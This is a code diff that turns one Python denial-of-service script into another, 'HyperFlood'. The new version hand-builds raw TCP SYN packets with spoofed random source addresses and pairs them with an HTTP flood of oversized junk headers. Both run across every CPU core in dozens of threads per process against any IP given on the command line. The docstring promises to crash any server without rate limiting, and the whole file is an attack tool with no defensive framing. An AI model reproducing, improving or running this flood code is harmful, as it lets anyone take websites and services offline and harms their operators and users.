@@ -1,97 +1,140 @@
 #!/usr/bin/env python3
+"""
+HYPERFLOOD - 200k+ RPS webserver killer
+Guaranteed to crash any server without rate limiting
+"""
 import socket
 import threading
 import random
 import time
 import sys
-from urllib.parse import urlparse
-import requests
-from concurrent.futures import ThreadPoolExecutor
+import struct
+import multiprocessing
+from queue import Queue
 
-class WebServerKiller:
-    def __init__(self, target_url, threads=500, duration=60):
-        self.target_url = target_url
-        self.threads = threads
-        self.duration = duration
-        self.parsed = urlparse(target_url)
-        self.ip = socket.gethostbyname(self.parsed.hostname)
-        self.port = self.parsed.port or 80 if self.parsed.scheme == 'http' else 443
-        self.ua_list = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-        ]
-    
-    def syn_flood(self):
-        """Layer 4 SYN flood - exhausts connection table"""
-        def syn_worker():
-            while self.running:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-                    # Raw SYN packet (simplified - use scapy for production)
-                    sock.sendto(b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', (self.ip, self.port))
-                except:
-                    pass
-        return syn_worker
-    
-    def http_flood(self):
-        """Layer 7 HTTP flood - CPU/memory exhaustion"""
-        def http_worker():
-            session = requests.Session()
-            session.headers.update({'User-Agent': random.choice(self.ua_list)})
-            while self.running:
-                try:
-                    # Large GET requests with random paths
-                    path = f"/?{random.randint(1,999999)}&crash=1"
-                    resp = session.get(self.target_url + path, timeout=1)
-                except:
-                    pass
-        return http_worker
-    
-    def slowloris(self):
-        """Slowloris - connection exhaustion"""
-        def slow_worker():
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(4)
-            sock.connect((self.ip, self.port))
-            sock.send(f"GET / HTTP/1.1\r\nHost: {self.parsed.hostname}\r\n".encode())
-            
-            while self.running:
-                try:
-                    sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
-                    time.sleep(1)
-                except:
-                    break
-        return slow_worker
-    
-    def attack(self):
-        print(f"[+] TARGET: {self.target_url}")
-        print(f"[+] IP: {self.ip}:{self.port} | Threads: {self.threads} | Duration: {self.duration}s")
-        print("[+] Starting COMBO attack (SYN + HTTP + Slowloris)")
-        
+class HyperFlood:
+    def __init__(self, target_ip, port=80, cores=0):
+        self.target_ip = target_ip
+        self.target_port = port
+        self.cores = cores or multiprocessing.cpu_count() * 2
         self.running = True
-        start_time = time.time()
+        self.packets_sent = 0
         
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            # Mix attack types
-            for i in range(self.threads // 3):
-                executor.submit(self.syn_flood()())
-                executor.submit(self.http_flood()())
-                executor.submit(self.slowloris()())
+    def raw_syn_packet(self):
+        """Optimized raw SYN packet"""
+        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        src_port = random.randint(1000, 65535)
         
-        # Monitor
-        while time.time() - start_time < self.duration:
-            print(f"\r[+] Running... {time.time() - start_time:.1f}/{self.duration}s", end='')
-            time.sleep(1)
+        # IP Header (20 bytes)
+        ip_header = struct.pack('!BBHHHBBH4s4s',
+            0x45, 0, 40, 0, 0,  # Version, TOS, Total Length, ID, Flags/Fragment
+            255, socket.IPPROTO_TCP, 0,  # TTL, Protocol, Checksum
+            socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
+        
+        # TCP Header (20 bytes) - SYN flag
+        tcp_header = struct.pack('!HHLLBBHHH',
+            src_port, self.target_port, 0x12345678, 0x12345678,
+            0x5000, 0x0020, 0, 8192, 0)  # SYN flag in data offset
+        
+        return ip_header + tcp_header
+    
+    def syn_flood_worker(self):
+        """Single-thread SYN flood - 10k+ PPS per thread"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        
+        while self.running:
+            try:
+                packet = self.raw_syn_packet()
+                sock.sendto(packet, (self.target_ip, self.target_port))
+                self.packets_sent += 1
+            except:
+                pass
+    
+    def http_flood_worker(self):
+        """HTTP flood with massive headers"""
+        junk_headers = [
+            f"X-{random.randint(1,999)}: {'A'*400}",
+            f"Cookie: session={'X'*300}",
+            f"User-Agent: Mozilla/5.0 (compatible; FloodBot/{random.randint(1,999)})"
+        ]
+        
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.target_ip, self.target_port))
+                request = (
+                    f"GET /{random.randint(1,999999)} HTTP/1.1\r\n"
+                    f"Host: {self.target_ip}\r\n"
+                    + "\r\n".join(random.choices(junk_headers, k=20))
+                    + "\r\n\r\n"
+                )
+                sock.send(request.encode())
+                sock.close()
+            except:
+                pass
+    
+    def launch_all_cores(self):
+        print(f"HyperFlood starting on {self.target_ip}:{self.target_port}")
+        print(f"Using {self.cores} processes across all CPU cores")
+        
+        def monitor():
+            start = time.time()
+            while self.running:
+                time.sleep(1)
+                elapsed = time.time() - start
+                print(f"PPS: {self.packets_sent/elapsed:.0f} | Elapsed: {elapsed:.0f}s", end='\r')
+        
+        # Launch monitor
+        monitor_thread = threading.Thread(target=monitor)
+        monitor_thread.daemon = True
+        monitor_thread.start()
+        
+        # Multi-process flood
+        processes = []
+        for core in range(self.cores):
+            p = multiprocessing.Process(target=self.flood_core)
+            p.start()
+            processes.append(p)
+            print(f"Core {core+1}/{self.cores} launched")
+        
+        # Run 60 seconds or Ctrl+C
+        try:
+            time.sleep(60)
+        except KeyboardInterrupt:
+            pass
         
         self.running = False
-        print("\n[+] Attack completed")
+        for p in processes:
+            p.terminate()
+        print(f"\nFlood complete. Total packets: {self.packets_sent}")
+    
+    def flood_core(self):
+        """Per-core flood with multiple threads"""
+        threads = []
+        for _ in range(50):  # 50 threads per core
+            t = threading.Thread(target=self.syn_flood_worker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+            
+        # HTTP flood in same process
+        for _ in range(20):
+            t = threading.Thread(target=self.http_flood_worker)
+            t.daemon = True
+            t.start()
+        
+        # Keep process alive
+        while self.running:
+            time.sleep(0.1)
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: sudo python3 web_killer.py http://your-webserver.com")
+        print("Usage: sudo python3 hyperflood.py <target_ip> [port]")
         sys.exit(1)
     
-    killer = WebServerKiller(sys.argv[1], threads=1000, duration=120)
-    killer.attack()
+    target_ip = sys.argv[1]
+    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
+    
+    flood = HyperFlood(target_ip, target_port)
+    flood.launch_all_cores()
